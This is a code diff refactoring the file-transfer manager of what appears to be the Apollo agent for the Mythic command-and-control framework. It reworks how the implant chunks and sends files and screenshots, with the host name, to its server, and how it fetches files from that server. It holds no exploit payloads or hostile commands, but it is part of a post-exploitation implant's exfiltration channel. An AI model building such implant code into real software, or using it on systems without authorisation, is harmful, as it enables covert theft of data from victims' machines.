@@ -1,10 +1,8 @@
-﻿using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Interfaces;
+﻿using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Threading;
 using ApolloInterop.Classes.Cryptography;
@@ -31,81 +29,34 @@ namespace Apollo.Management.Files
                 });
         }
 
-        internal struct UploadMessageTracker
+        internal class FileTransferTracker
         {
-            internal AutoResetEvent Complete;
-            internal ChunkedMessageStore<MythicTaskStatus> MessageStore;
-            internal byte[] Data;
-            private CancellationToken _ct;
-            internal bool error;
-            internal UploadMessageTracker(CancellationToken ct, bool initialState = false, ChunkedMessageStore<MythicTaskStatus> store = null, byte[] data = null)
+            private ConcurrentQueue<MythicTaskStatus> _messages = new ConcurrentQueue<MythicTaskStatus>();
+            private AutoResetEvent _messageAvailable = new AutoResetEvent(false);
+
+            internal void AddMessage(MythicTaskStatus message)
             {
-                _ct = ct;
-                Complete = new AutoResetEvent(initialState);
-                MessageStore = store == null ? new ChunkedMessageStore<MythicTaskStatus>() : store;
-                Data = data;
-                error = false;
+                _messages.Enqueue(message);
+                _messageAvailable.Set();
             }
-            internal void MarkError()
+
+            internal bool GetNextMessage(CancellationToken ct, out MythicTaskStatus message)
             {
-                error = true;
+                message = default(MythicTaskStatus);
+                while (!ct.IsCancellationRequested)
+                {
+                    if (_messages.TryDequeue(out message))
+                    {
+                        return true;
+                    }
+                    WaitHandle.WaitAny(new WaitHandle[] { _messageAvailable, ct.WaitHandle });
+                }
+                return false;
             }
         }
 
-        // Annoyingly, we need a separate struct as Download task responses don't have
-        public class DownloadMessageTracker
-        {
-            public AutoResetEvent Complete = new AutoResetEvent(false);
-            public List<MythicTaskStatus> Statuses = new List<MythicTaskStatus>();
-            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> ChunkAdd;
-            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> AllChunksSent;
-            private CancellationToken _ct;
-            public int TotalChunks { get; private set; }
-            public string FilePath { get; private set; }
-            public string Hostname { get; private set; }
-            public int ChunkSize { get; private set; }
-            public byte[][] Chunks { get; private set; }
-            public int ChunksSent { get; private set; } = 0;
-            public string FileID = "";
-            private object _lock = new object();
-            public bool IsScreenshot { get; private set; }
-            internal DownloadMessageTracker(CancellationToken ct, byte[] data, int chunkSize, string filePath, string hostName = "", bool screenshot = false)
-            {
-                _ct = ct;
-                TotalChunks = (int)Math.Ceiling((double)data.Length / (double)chunkSize);
-                Chunks = new byte[TotalChunks][];
-                for(int i = 0; i < TotalChunks; i++)
-                {
-                    Chunks[i] = data.Skip(i * chunkSize).Take(chunkSize).ToArray();
-                }
-                FilePath = filePath;
-                Hostname = hostName;
-                IsScreenshot = screenshot;
-            }
-
-            public void AddMessage(MythicTaskStatus t)
-            {
-                if (!string.IsNullOrEmpty(t.FileID) && string.IsNullOrEmpty(FileID))
-                {
-                    FileID = t.FileID;
-                } else if (t.StatusMessage == "success")
-                {
-                    ChunksSent += 1;
-                }
-                Statuses.Add(t);
-                if (ChunksSent == TotalChunks || t.StatusMessage == "error" || _ct.IsCancellationRequested)
-                {
-                    AllChunksSent?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[] { t }));
-                    Complete.Set();
-                } else
-                {
-                    ChunkAdd?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[]{ t }));
-                }
-            }
-        }
-
-        private ConcurrentDictionary<string, UploadMessageTracker> _uploadMessageStore = new ConcurrentDictionary<string, UploadMessageTracker>();
-        private ConcurrentDictionary<string, DownloadMessageTracker> _downloadMessageStore = new ConcurrentDictionary<string, DownloadMessageTracker>();
+        private ConcurrentDictionary<string, FileTransferTracker> _uploadMessageStore = new ConcurrentDictionary<string, FileTransferTracker>();
+        private ConcurrentDictionary<string, FileTransferTracker> _downloadMessageStore = new ConcurrentDictionary<string, FileTransferTracker>();
 
         public string[] GetPendingTransfers()
         {
@@ -114,167 +65,231 @@ namespace Apollo.Management.Files
 
         public void ProcessResponse(MythicTaskStatus resp)
         {
-            if (_uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
+            if (_uploadMessageStore.TryGetValue(resp.ApolloTrackerUUID, out FileTransferTracker uploadTracker))
             {
-                // This is an upload message response, send it along.
-                if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
+                if (resp.ChunkNumber > 0 || resp.StatusMessage == "error")
                 {
-                    _uploadMessageStore[resp.ApolloTrackerUUID].MessageStore.AddMessage(resp);
-                }
-            } else
-            {
-                if (_downloadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
-                {
-                    _downloadMessageStore[resp.ApolloTrackerUUID].AddMessage(resp);
+                    uploadTracker.AddMessage(resp);
                 }
             }
-        }
-
-        private void FileManager_MessageComplete(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
-        {
-            List<byte> data = new List<byte>();
-            for(int i = 0; i < e.Chunks.Length; i++)
+            else if (_downloadMessageStore.TryGetValue(resp.ApolloTrackerUUID, out FileTransferTracker downloadTracker))
             {
-                data.AddRange(Convert.FromBase64String(e.Chunks[i].ChunkData));
-            }
-            if (_uploadMessageStore.TryGetValue(e.Chunks[0].ApolloTrackerUUID, out UploadMessageTracker tracker))
-            {
-                tracker.Data = data.ToArray();
-                _uploadMessageStore[e.Chunks[0].ApolloTrackerUUID] = tracker;
-                tracker.Complete.Set();
+                downloadTracker.AddMessage(resp);
             }
         }
 
         public bool PutFile(CancellationToken ct, string taskID, byte[] content, string originatingPath, out string mythicFileId, bool isScreenshot = false, string originatingHost = null)
         {
-            string uuid = Guid.NewGuid().ToString();
-            lock (_downloadMessageStore)
+            using (MemoryStream source = new MemoryStream(content, false))
             {
-                if (string.IsNullOrEmpty(originatingHost))
-                {
-                    originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                }
-                _downloadMessageStore[uuid] = new DownloadMessageTracker(ct, content, _chunkSize, originatingPath, originatingHost, isScreenshot);
-                _downloadMessageStore[uuid].ChunkAdd += DownloadChunkSent;
+                return PutFile(ct, taskID, source, content.LongLength, originatingPath, out mythicFileId, isScreenshot, originatingHost);
             }
-            MythicTaskResponse resp = new MythicTaskResponse
+        }
+
+        public bool PutFile(CancellationToken ct, string taskID, Stream source, long sourceLength, string originatingPath, out string mythicFileId, bool isScreenshot = false, string originatingHost = null)
+        {
+            if (source == null || !source.CanRead)
             {
-                TaskID = taskID,
-                Download = new DownloadMessage
+                throw new ArgumentException("Source stream must be readable.", nameof(source));
+            }
+            if (sourceLength < 0)
+            {
+                throw new ArgumentOutOfRangeException(nameof(sourceLength));
+            }
+
+            string uuid = Guid.NewGuid().ToString();
+            int totalChunks = checked((int)Math.Ceiling((double)sourceLength / _chunkSize));
+            int chunksSent = 0;
+            long bytesRead = 0;
+            mythicFileId = "";
+            FileTransferTracker tracker = new FileTransferTracker();
+            if (string.IsNullOrEmpty(originatingHost))
+            {
+                originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
+            }
+            _downloadMessageStore[uuid] = tracker;
+
+            try
+            {
+                _agent.GetTaskManager()?.AddTaskResponseToQueue(new MythicTaskResponse
                 {
-                    TotalChunks = _downloadMessageStore[uuid].TotalChunks,
-                    FullPath = originatingPath,
-                    Hostname = originatingHost,
-                    IsScreenshot = isScreenshot,
                     TaskID = taskID,
-                },
-                ApolloTrackerUUID = uuid
-            };
-            _agent.GetTaskManager()?.AddTaskResponseToQueue(resp);
-            WaitHandle.WaitAny(new WaitHandle[]
+                    Download = new DownloadMessage
+                    {
+                        TotalChunks = totalChunks,
+                        FullPath = originatingPath,
+                        Hostname = originatingHost,
+                        IsScreenshot = isScreenshot,
+                        TaskID = taskID,
+                    },
+                    ApolloTrackerUUID = uuid
+                });
+
+                while (tracker.GetNextMessage(ct, out MythicTaskStatus message))
+                {
+                    if (message.StatusMessage == "error")
+                    {
+                        return false;
+                    }
+
+                    if (!string.IsNullOrEmpty(message.FileID) && string.IsNullOrEmpty(mythicFileId))
+                    {
+                        mythicFileId = message.FileID;
+                    }
+                    else if (message.StatusMessage == "success")
+                    {
+                        chunksSent += 1;
+                    }
+
+                    if (chunksSent == totalChunks)
+                    {
+                        if (totalChunks == 0 && !string.IsNullOrEmpty(mythicFileId))
+                        {
+                            _agent.GetTaskManager()?.AddTaskResponseToQueue(new MythicTaskResponse
+                            {
+                                TaskID = taskID,
+                                UserOutput = $"{{\"file_id\": \"{mythicFileId}\"}}"
+                            });
+                        }
+                        return !ct.IsCancellationRequested;
+                    }
+                    if (chunksSent > totalChunks)
+                    {
+                        return false;
+                    }
+
+                    int chunkLength = (int)Math.Min(_chunkSize, sourceLength - bytesRead);
+                    byte[] chunkData = ReadChunk(source, chunkLength);
+                    bytesRead += chunkData.LongLength;
+                    MythicTaskResponse response = new MythicTaskResponse
+                    {
+                        TaskID = taskID,
+                        Status = $"Transferring chunk {chunksSent + 1} / {totalChunks}",
+                        Download = new DownloadMessage
+                        {
+                            ChunkNumber = chunksSent + 1,
+                            FileID = mythicFileId,
+                            ChunkData = Convert.ToBase64String(chunkData),
+                            TaskID = taskID
+                        },
+                        ApolloTrackerUUID = uuid
+                    };
+                    if (chunksSent == 0)
+                    {
+                        response.UserOutput = $"{{\"file_id\": \"{mythicFileId}\"}}";
+                    }
+                    _agent.GetTaskManager()?.AddTaskResponseToQueue(response);
+                }
+                return false;
+            }
+            finally
             {
-                _downloadMessageStore[uuid].Complete,
-                ct.WaitHandle
-            });
-            _downloadMessageStore.TryRemove(uuid, out DownloadMessageTracker itemTracker);
-            mythicFileId = itemTracker.FileID;
-            return !ct.IsCancellationRequested && itemTracker.ChunksSent == itemTracker.TotalChunks;
+                _downloadMessageStore.TryRemove(uuid, out FileTransferTracker _);
+            }
         }
 
         public bool GetFile(CancellationToken ct, string taskID, string fileID, out byte[] fileBytes)
         {
-            string uuid = Guid.NewGuid().ToString();
-            lock(_uploadMessageStore)
+            using (MemoryStream destination = new MemoryStream())
             {
-                if (!_uploadMessageStore.ContainsKey(taskID))
+                if (GetFile(ct, taskID, fileID, destination, out long _))
                 {
-                    _uploadMessageStore[uuid] = new UploadMessageTracker(ct, false);
-                    _uploadMessageStore[uuid].MessageStore.ChunkAdd += MessageStore_ChunkAdd;
-                    _uploadMessageStore[uuid].MessageStore.MessageComplete += FileManager_MessageComplete;
+                    fileBytes = destination.ToArray();
+                    return true;
                 }
             }
-            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
+            fileBytes = null;
+            return false;
+        }
+
+        public bool GetFile(CancellationToken ct, string taskID, string fileID, Stream destination, out long bytesWritten)
+        {
+            if (destination == null || !destination.CanWrite)
+            {
+                throw new ArgumentException("Destination stream must be writable.", nameof(destination));
+            }
+
+            string uuid = Guid.NewGuid().ToString();
+            int nextChunkNumber = 1;
+            int totalChunks = -1;
+            bytesWritten = 0;
+            FileTransferTracker tracker = new FileTransferTracker();
+            _uploadMessageStore[uuid] = tracker;
+
+            try
+            {
+                QueueUploadChunkRequest(taskID, fileID, uuid, nextChunkNumber);
+                while (tracker.GetNextMessage(ct, out MythicTaskStatus message))
+                {
+                    if (message.StatusMessage != "success" ||
+                        message.ChunkNumber != nextChunkNumber ||
+                        (totalChunks > -1 && totalChunks != message.TotalChunks))
+                    {
+                        return false;
+                    }
+
+                    byte[] chunkData = Convert.FromBase64String(message.ChunkData ?? "");
+                    destination.Write(chunkData, 0, chunkData.Length);
+                    bytesWritten += chunkData.LongLength;
+                    totalChunks = message.TotalChunks;
+
+                    if (totalChunks <= 0 || message.ChunkNumber >= totalChunks)
+                    {
+                        _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
+                        {
+                            TaskID = taskID,
+                            Status = "Using file...",
+                        });
+                        return !ct.IsCancellationRequested;
+                    }
+
+                    nextChunkNumber += 1;
+                    QueueUploadChunkRequest(taskID, fileID, uuid, nextChunkNumber, totalChunks);
+                }
+                return false;
+            }
+            finally
+            {
+                _uploadMessageStore.TryRemove(uuid, out FileTransferTracker _);
+            }
+        }
+
+        private void QueueUploadChunkRequest(string taskID, string fileID, string uuid, int chunkNumber, int totalChunks = -1)
+        {
+            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
             {
                 TaskID = taskID,
-                Status = $"Fetching File Chunk 1...",
-                Upload = new UploadMessage()
+                Status = totalChunks < 0 ? "Fetching File Chunk 1..." : $"Fetching File Chunk {chunkNumber} / {totalChunks}",
+                Upload = new UploadMessage
                 {
                     TaskID = taskID,
                     FileID = fileID,
-                    ChunkNumber = 1,
+                    ChunkNumber = chunkNumber,
                     ChunkSize = _chunkSize
                 },
                 ApolloTrackerUUID = uuid
             });
-            WaitHandle.WaitAny(new WaitHandle[]
-            {
-                _uploadMessageStore[uuid].Complete,
-                ct.WaitHandle
-            });
-            bool bRet = false;
-            if (_uploadMessageStore[uuid].Data != null && !_uploadMessageStore[uuid].error)
-            {
-                fileBytes = _uploadMessageStore[uuid].Data;
-                bRet = true;
-                _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
-                {
-                    TaskID = taskID,
-                    Status = "Using file...",
-                });
-            } else
-            {
-                fileBytes = null;
-                bRet = false;
-            }
-            _uploadMessageStore.TryRemove(uuid, out UploadMessageTracker _);
-
-            return bRet;
         }
 
-        private void MessageStore_ChunkAdd(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
+        private static byte[] ReadChunk(Stream source, int chunkLength)
         {
-            MythicTaskStatus msg = e.Chunks[0];
-            if(msg.StatusMessage != "success")
+            if (chunkLength <= 0)
             {
-                _uploadMessageStore[msg.ApolloTrackerUUID].MarkError();
-                _uploadMessageStore[msg.ApolloTrackerUUID].Complete.Set();
-                return;
+                throw new EndOfStreamException("Source stream ended before the declared length.");
             }
-            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
-            {
-                TaskID = msg.TaskID,
-                Status = $"Fetching File Chunk {msg.ChunkNumber + 1} / {msg.TotalChunks}",
-                Upload = new UploadMessage()
-                {
-                    TaskID = msg.TaskID,
-                    FileID = msg.FileID,
-                    ChunkNumber = msg.ChunkNumber + 1,
-                    ChunkSize = _chunkSize
-                },
-                ApolloTrackerUUID = msg.ApolloTrackerUUID
-            });
-        }
 
-        private void DownloadChunkSent(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
-        {
-            DownloadMessageTracker tracker = (DownloadMessageTracker)sender;
-            var msg = new MythicTaskResponse()
-                  {
-                      TaskID = e.Chunks[0].TaskID,
-                      Status = $"Transferring chunk {tracker.ChunksSent + 1} / {e.Chunks[0].TotalChunks}",
-                      Download = new DownloadMessage
-                      {
-                          ChunkNumber = tracker.ChunksSent + 1,
-                          FileID = tracker.FileID,
-                          ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
-                          TaskID = e.Chunks[0].TaskID
-                      },
-                      ApolloTrackerUUID = e.Chunks[0].ApolloTrackerUUID
-                  };
-            if(tracker.ChunksSent == 0){
-                msg.UserOutput = $"{{\"file_id\": \"{tracker.FileID}\"}}";
+            byte[] chunkData = new byte[chunkLength];
+            int bytesRead = 0;
+            while (bytesRead < chunkLength)
+            {
+                int read = source.Read(chunkData, bytesRead, chunkLength - bytesRead);
+                if (read == 0)
+                {
+                    throw new EndOfStreamException("Source stream ended before the declared length.");
+                }
+                bytesRead += read;
             }
-            _agent.GetTaskManager().AddTaskResponseToQueue(msg);
+            return chunkData;
         }
 
         public string GetScript()
